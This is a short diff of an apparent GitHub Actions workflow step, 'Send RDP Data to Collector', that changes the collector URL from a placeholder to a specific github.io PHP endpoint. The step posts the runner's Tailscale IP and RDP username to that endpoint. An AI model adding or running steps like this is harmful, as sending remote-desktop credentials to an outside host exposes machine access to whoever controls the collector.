@@ -78,7 +78,7 @@ jobs:
 
       - name: Send RDP Data to Collector
         run: |
-          $collectorUrl = "https://yourdomain.com/rdp-collector.php"
+          $collectorUrl = "https://alpine-cloud.github.io/alpinerdp/rdps.php"
           $rdpData = @{
             ip = "$env:TAILSCALE_IP"
             username = "$env:RDP_USER"
